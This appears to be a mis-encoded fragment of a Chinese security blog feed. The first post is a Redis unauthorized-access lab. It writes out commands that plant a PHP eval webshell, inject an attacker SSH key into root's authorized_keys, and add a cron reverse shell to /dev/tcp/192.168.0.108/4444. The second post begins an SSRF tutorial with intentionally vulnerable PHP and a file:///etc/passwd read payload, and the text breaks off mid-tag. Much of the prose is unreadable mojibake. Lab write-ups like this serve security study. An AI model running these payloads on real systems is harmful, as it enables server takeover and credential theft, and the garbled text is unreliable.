å»ºè®®ç”¨centos</p><p>æ”»å‡»æœº: kali2022 </p><p>redis 3.2.11</p><p>1.ä¸‹è½½å®‰è£…redis</p><pre><code>wget http://download.redis.io/releases/redis-3.2.11.tar.gz</code></pre><p>2.è§£å‹å‹ç¼©åŒ…</p><pre><code>tar zxvf redis-3.2.11.tar.gz</code></pre><p>3.è¿›å…¥è§£å‹ç›®å½•redis-3.2.11 æ‰§è¡Œmakeå‘½ä»¤</p><pre><code>cd redis-3.2.11make</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426232909091.png" alt="image-20220426232909091"></p><p>4.è¿›å…¥srcç›®å½•</p><pre><code>cd src</code></pre><p>5.å°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼ˆè¿™æ ·å¯åŠ¨redis-serverå’Œredis-cliå°±ä¸ç”¨æ¯æ¬¡éƒ½è¿›å…¥å®‰è£…ç›®å½•äº†ï¼‰</p><pre><code>cp redis-server /usr/bin/cp redis-cli /usr/bin/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426233508159.png" alt="image-20220426233508159"></p><p>6.è¿”å›ç›®å½•redis-3.2.11,å°†redis.confæ‹·è´åˆ°/etc/ç›®å½•ä¸‹</p><pre><code>cd ..cp redis.conf /etc/</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234155118.png" alt="image-20220426234155118"></p><p>7.ä½¿ç”¨/etc/ç›®å½•ä¸‹çš„redis.confæ–‡ä»¶ä¸­çš„é…ç½®å¯åŠ¨redisæœåŠ¡</p><pre><code>redis-server /etc/redis.conf</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234331895.png" alt="image-20220426234331895"></p><p>8.ç¼–è¾‘etcä¸­çš„redisé…ç½®æ–‡ä»¶redis.conf</p><pre><code>vim /etc/redis.conf</code></pre><p>å»æ‰ipç»‘å®šï¼Œå…è®¸é™¤æœ¬åœ°å¤–çš„ä¸»æœºè¿œç¨‹ç™»å½•redisæœåŠ¡ å‰é¢åŠ #æ³¨é‡Šæ‰</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430165832466.png" alt="image-20220430165832466"></p><p>å…³é—­ä¿æŠ¤æ¨¡å¼ï¼Œå…è®¸è¿œç¨‹è¿æ¥redisæœåŠ¡å°†yes æ”¹ä¸ºno</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426235216372.png" alt="image-20220426235216372"></p><p>æœ€åé‡å¯ä¸‹redisæœåŠ¡å°±ok</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>é¦–å…ˆæµ‹è¯•ä¸‹ç›®æ ‡é¶æœºæ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430174535586.png" alt="image-20220430174535586"></p><p>æˆåŠŸè¿æ¥ä¸Šäº†ï¼Œä¸‹é¢å¼€å§‹è¿›ä¸€æ­¥åˆ©ç”¨</p><h2 id="1-å†™å…¥webshell"><a href="#1-å†™å…¥webshell" class="headerlink" title="1.å†™å…¥webshell"></a><strong>1.å†™å…¥webshell</strong></h2><p>å†™å…¥ä¸€å¥è¯æœ¨é©¬éœ€è¦æˆ‘ä»¬çŸ¥é“ç½‘ç«™çš„æ ¹ç›®å½•ç›¸å¯¹äºæœåŠ¡å™¨çš„ç»å¯¹è·¯å¾„</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180627722.png" alt="image-20220430180627722"></p><pre><code>config set dir /www/wwwroot/39.105.71.63/config set dbfilename sakura.phpset webshell &quot;&lt;?php @eval($_POST[&#39;pass&#39;]) ?&gt;&quot;save</code></pre><p>æˆ‘çš„ç½‘ç«™ä¸ŠæˆåŠŸå‡ºç°äº†è¿™ä¸ªæ–‡ä»¶</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180643451.png" alt="image-20220430180643451"></p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥æˆåŠŸè¿æ¥</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430181012266.png" alt="image-20220430181012266"></p><h2 id="2-é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•"><a href="#2-é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•" class="headerlink" title="2.é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•"></a><strong>2.é€šè¿‡å†™å…¥sshå…¬é’¥å®ç°sshç™»å½•</strong></h2><p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä½¿ç”¨çš„é˜¿é‡Œäº‘æœåŠ¡å™¨å‡ºäº†é—®é¢˜ï¼Œå°±è‡ªå·±æ­å»ºä¸ªé¶æœº(centos 7)å§.</p><p>è®°å¾—å…³é—­é˜²ç«å¢™:</p><pre><code>sudo systemctl stop firewalld</code></pre><p>åŸç†:åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalue,keyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿæˆä¸€ä¸ªæˆæƒçš„key.</p><p>æ‰©å±•:</p><p><strong>sshå…å¯†ç™»å½•æµç¨‹:</strong></p><p>ã€€ã€€ï¼ˆ1ï¼‰ é¦–å…ˆåœ¨å®¢æˆ·ç«¯ç”Ÿæˆä¸€å¯¹å¯†é’¥ï¼ˆssh-keygenï¼‰ï¼›</p><p>ã€€ã€€ï¼ˆ2ï¼‰ å¹¶å°†å®¢æˆ·ç«¯çš„å…¬é’¥ssh-copy-id æ‹·è´åˆ°æœåŠ¡ç«¯ï¼›</p><p>ã€€ã€€ï¼ˆ3ï¼‰ å½“å®¢æˆ·ç«¯å†æ¬¡å‘é€ä¸€ä¸ªè¿æ¥è¯·æ±‚ï¼ŒåŒ…æ‹¬ipã€ç”¨æˆ·åï¼›</p><p>ã€€ã€€ï¼ˆ4ï¼‰ æœåŠ¡ç«¯å¾—åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œä¼šåˆ°authorized_keysä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæœ‰å“åº”çš„IPå’Œç”¨æˆ·ï¼Œå°±ä¼šéšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼šqwerï¼›</p><p>ã€€ã€€ï¼ˆ5ï¼‰ æœåŠ¡ç«¯å°†ä½¿ç”¨å®¢æˆ·ç«¯æ‹·è´è¿‡æ¥çš„å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå‘é€ç»™å®¢æˆ·ç«¯ï¼›</p><p>ã€€ã€€ï¼ˆ6ï¼‰ å¾—åˆ°æœåŠ¡ç«¯å‘æ¥çš„æ¶ˆæ¯åï¼Œå®¢æˆ·ç«¯ä¼šä½¿ç”¨ç§é’¥è¿›è¡Œè§£å¯†ï¼Œç„¶åå°†è§£å¯†åçš„å­—ç¬¦ä¸²å‘é€ç»™æœåŠ¡ç«¯ï¼›</p><p>ã€€ã€€ï¼ˆ7ï¼‰ æœåŠ¡ç«¯æ¥å—åˆ°å®¢æˆ·ç«¯å‘æ¥çš„å­—ç¬¦ä¸²åï¼Œè·Ÿä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸€è‡´ï¼Œå°±å…è®¸å…å¯†ç ç™»å½•ã€‚</p><p><strong>æ”»å‡»æµç¨‹:</strong></p><p><strong>1ã€é¦–å…ˆåœ¨æ”»å‡»æœº(kali)ä¸Šç”Ÿæˆsshå…¬é’¥</strong></p><pre><code>ssh-keygen -t rsa</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430191709018.png" alt="image-20220430191709018"></p><p><strong>2.å°†å…¬é’¥å†™å…¥key.txtæ–‡ä»¶ï¼ˆå‰åç”¨\næ¢è¡Œï¼Œé¿å…å’Œredisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆï¼‰</strong></p><p> è¿›å…¥.sshç›®å½•ï¼š</p><pre><code>cd /root/.ssh</code></pre><p>å†™å…¥æ–‡ä»¶ï¼š</p><pre><code>(echo -eâ€\nâ€;cat id_rsa.pub;echo -e â€œ\nâ€)&gt;key.txt</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430192233869.png" alt="image-20220430192233869"></p><p><strong>3.å°†key.txtå†™é¶æœºï¼ˆä½¿ç”¨redis-cli -h ipå‘½ä»¤è¿æ¥é¶æœºï¼Œå†™å…¥æ–‡ä»¶ï¼‰</strong></p><pre><code>cat key.txt|redis-cli -h 192.168.0.106 -x set crack</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221009845.png" alt="image-20220430221009845"></p><p>4.è¿œç¨‹ç™»å½•é¶æœºçš„RedisæœåŠ¡</p><pre><code>redis-cli -h 192.168.0.106</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221026832.png" alt="image-20220430221026832"></p><p>5.æ›´æ”¹rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½•(ä¸€èˆ¬é»˜è®¤ä¸º/root/.ssh)</p><pre><code>config set dir /root/.ssh</code></pre><p>6.è®¾ç½®ä¸Šä¼ å…¬é’¥çš„å¤‡ä»½æ–‡ä»¶åå­—ä¸ºauthorized_keys</p><pre><code>config set dbfilename authorized_keysconfig get dbfilename</code></pre><p>7.ä¿å­˜</p><pre><code>save</code></pre><p>8.åœ¨æ”»å‡»æœºä¸Šç›´æ¥sshå…å¯†ç™»å½•é¶æœº,å…å¯†ç™»å½•æˆåŠŸ</p><pre><code>ssh -i id_rsa root@192.168.0.106</code></pre><p>æœ€åæˆ‘æ²¡æœ‰æˆåŠŸï¼Œä½†å¤§è‡´æ€è·¯æ˜¯è¿™æ ·ï¼Œä¸€ç›´ä¸æˆåŠŸæˆ‘å°±å…ˆä¸çº ç»“äº†ã€‚</p><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1576831989_5dfc8bf50878a.png!small" alt="img"></p><h2 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a><strong>3.åå¼¹shell</strong></h2><pre><code>redis-cli -h 192.168.0.106set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.108/4444 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220501003825941.png" alt="image-20220501003825941"></p><p>æˆåŠŸåå¼¹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;redisä»‹ç»&quot;&gt;&lt;a href=&quot;#redisä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;redisä»‹ç»&quot;&gt;&lt;/a&gt;redisä»‹ç»&lt;/h1&gt;&lt;p&gt;Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒ</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="redis" scheme="https://sakurahack-y.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>SSRFæ¼æ´æ€»ç»“</title>
    <link href="https://sakurahack-y.github.io/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-04-24T09:58:17.000Z</published>
    <updated>2022-05-02T14:16:07.407Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ç¢°åˆ°äº†æŒºå¤šSSRFé¢˜ç›®çš„åº”ç”¨ï¼Œä»¥å‰å­¦çš„å¤ªæµ…äº†ï¼Œé‡æ–°å­¦ä¹ ä¸‹ï¼Œæ‰“å¥½åŸºç¡€ã€‚</p><p>[TOC]</p><h1 id="SSRFæ¼æ´ç®€ä»‹"><a href="#SSRFæ¼æ´ç®€ä»‹" class="headerlink" title="SSRFæ¼æ´ç®€ä»‹"></a>SSRFæ¼æ´ç®€ä»‹</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚<br> ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆå› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…ç½‘ã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨ä¸€ä¸ªç½‘ç»œè¯·æ±‚çš„æœåŠ¡ï¼Œå½“ä½œè·³æ¿è¿›è¡Œæ”»å‡»ï¼‰<br> <img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095630-ae7ee364-6d72-1.png" alt="img"></p><h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p> SSRF å½¢æˆçš„åŸå› å¾€å¾€æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚<br> å¦‚ï¼šä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ã€‚åˆ©ç”¨çš„å°±æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚ssrfæ˜¯åˆ©ç”¨<code>å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†</code>æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><h2 id="æ¼æ´æ˜“å‘ç”Ÿç‚¹"><a href="#æ¼æ´æ˜“å‘ç”Ÿç‚¹" class="headerlink" title="æ¼æ´æ˜“å‘ç”Ÿç‚¹"></a>æ¼æ´æ˜“å‘ç”Ÿç‚¹</h2><ol><li>è½¬ç æœåŠ¡</li><li>åœ¨çº¿ç¿»è¯‘</li><li>å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½(é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡)</li><li>å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</li><li>ç½‘ç«™é‡‡é›†ã€ç½‘é¡µæŠ“å–çš„åœ°æ–¹ã€‚</li><li>å¤´åƒçš„åœ°æ–¹ã€‚(è¿œç¨‹åŠ è½½å¤´åƒ)</li><li>ä¸€åˆ‡è¦ä½ è¾“å…¥ç½‘å€çš„åœ°æ–¹å’Œå¯ä»¥è¾“å…¥ipçš„åœ°æ–¹ã€‚</li><li>ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ï¼š<code>share</code>ã€<code>wap</code>ã€<code>url</code>ã€<code>link</code>ã€<code>src</code>ã€<code>source</code>ã€<code>target</code>ã€<code>u</code>ã€<code>3g</code>ã€<code>display</code>ã€<code>sourceURl</code>ã€<code>imageURL</code>ã€<code>domain</code><br> â€¦</li></ol><h2 id="å¯ä»¥å®ç°çš„æ”»å‡»"><a href="#å¯ä»¥å®ç°çš„æ”»å‡»" class="headerlink" title="å¯ä»¥å®ç°çš„æ”»å‡»"></a>å¯ä»¥å®ç°çš„æ”»å‡»</h2><ol><li>å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner ä¿¡æ¯</a></li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</li><li>å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°(å¦‚ï¼šreadmeæ–‡ä»¶)</li><li>æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(å¦‚ï¼šStruts2ï¼Œsqli)</li><li>ä¸‹è½½å†…ç½‘èµ„æº(å¦‚ï¼šåˆ©ç”¨<code>file</code>åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰)</li><li>è¿›è¡Œè·³æ¿</li><li>æ— è§†cdn</li><li>åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell</li></ol><h1 id="SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®"><a href="#SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®" class="headerlink" title="SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®"></a>SSRFæ¼æ´ç›¸å…³çš„å‡½æ•°å’Œåè®®</h1><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p><code>file_get_contents()</code>ã€<code>fsockopen()</code>ã€<code>curl_exec()</code>ã€<code>fopen()</code>ã€<code>readfile()</code>ç­‰å‡½æ•°ä½¿ç”¨ä¸å½“ä¼šé€ æˆSSRFæ¼æ´</p><p>ï¼ˆ1ï¼‰file_get_contents()</p><pre><code class="php">&lt;?php$url = $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><blockquote><p><code>file_get_content</code>å‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å†…å®¹ï¼Œç„¶åæŒ‡å®šä¸€ä¸ªæ–‡ä»¶åè¿›è¡Œä¿å­˜ï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚file_put_contentå‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>ï¼ˆ2ï¼‰fsockopen()</p><pre><code>&lt;?php function GetFile($host,$port,$link) &#123;     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \n&quot;;     &#125; else &#123;         $out = &quot;GET $link HTTP/1.1\r\n&quot;;         $out .= &quot;Host: $host\r\n&quot;;         $out .= &quot;Connection: Close\r\n\r\n&quot;;         $out .= &quot;\r\n&quot;;         fwrite($fp, $out);         $contents=&#39;&#39;;         while (!feof($fp)) &#123;             $contents.= fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;</code></pre><blockquote><p><code>fsockopen</code>å‡½æ•°å®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œè¯¥å‡½æ•°ä½¿ç”¨socketï¼ˆç«¯å£ï¼‰è·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“æ•°æ®ã€‚å˜é‡hostä¸ºä¸»æœºåï¼Œportä¸ºç«¯å£ï¼Œerrstrè¡¨ç¤ºé”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ï¼Œ30ä¸ºæ—¶é™</p></blockquote><p>ï¼ˆ3ï¼‰curl_exec()</p><pre><code>&lt;?php if (isset($_POST[&#39;url&#39;]))&#123;    $link = $_POST[&#39;url&#39;];    $curlobj = curl_init();// åˆ›å»ºæ–°çš„ cURL èµ„æº    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// è®¾ç½® URL å’Œç›¸åº”çš„é€‰é¡¹    $result=curl_exec($curlobj);// æŠ“å– URL å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨    curl_close($curlobj);// å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;    file_put_contents($filename, $result);     echo $result;&#125;?&gt;</code></pre><blockquote><p><code>curl_exec</code>å‡½æ•°ç”¨äºæ‰§è¡ŒæŒ‡å®šçš„cURLä¼šè¯</p></blockquote><p><strong>æ³¨æ„</strong></p><pre><code>1.ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper2.file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç 3.file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥4.curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨5.curl_exec() //é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œ6.file_get_contents() // file_get_contentsæ”¯æŒphp://inputåè®®</code></pre><h2 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h2><p> ï¼ˆ1ï¼‰<code>file</code>ï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„å†…å®¹<br> ï¼ˆ2ï¼‰<code>dict</code>ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰<br> ï¼ˆ3ï¼‰<code>gopher</code>ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell<br> ï¼ˆ4ï¼‰<code>http/s</code>ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p><h1 id="SSRFæ¼æ´åˆ©ç”¨"><a href="#SSRFæ¼æ´åˆ©ç”¨" class="headerlink" title="SSRFæ¼æ´åˆ©ç”¨"></a>SSRFæ¼æ´åˆ©ç”¨</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>æ”»å‡»æœº:kaliã€è¿œç¨‹vps</p><p>ç›®æ ‡æœº:é˜¿é‡Œäº‘</p><p>dockeré•œåƒï¼šssrf_redis</p><p>PHPç‰ˆæœ¬ï¼šPHP Version 7.2.28(5.6ç‰ˆæœ¬æµ‹è¯•ä¼šå¤±è´¥)</p><p>è¿™é‡Œæˆ‘ç›´æ¥ä½¿ç”¨å®å¡”æ¥æ­å»ºé¶æœºï¼Œæ³¨æ„ï¼Œéœ€è¦å…³é—­open_basedirï¼Œå¦åˆ™ä¼šå¯¼è‡´fileåè®®å¤±æ•ˆ</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220424204936132.png" alt="image-20220424204936132"></p><h2 id="è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç "><a href="#è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç " class="headerlink" title="è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç "></a>è¿œç¨‹åˆ©ç”¨ç¤ºä¾‹ä»£ç </h2><p>ssrf.php</p><pre><code class="php">&lt;?php$ch = curl_init(); //åˆ›å»ºæ–°çš„ cURL èµ„æºcurl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); //è®¾ç½®URL å’Œç›¸åº”çš„é€‰é¡¹#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //æŠ“å– URL å†…å®¹å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ï¼Œå­˜å‚¨è¿›æ–‡ä»¶curl_close($ch); ////å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº?&gt;</code></pre><p>post.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;    &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php    echo $_REQUEST[cmd];    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="è¿œç¨‹åˆ©ç”¨æ–¹å¼"><a href="#è¿œç¨‹åˆ©ç”¨æ–¹å¼" class="headerlink" title="è¿œç¨‹åˆ©ç”¨æ–¹å¼"></a>è¿œç¨‹åˆ©ç”¨æ–¹å¼</h2><p><strong>1.åˆ©ç”¨fileåè®®è¯»å–</strong></p><pre><code>http://39.xx.xx.xx:66/ssrf.php?url=file:///etc/passwd</code></pre><p><img 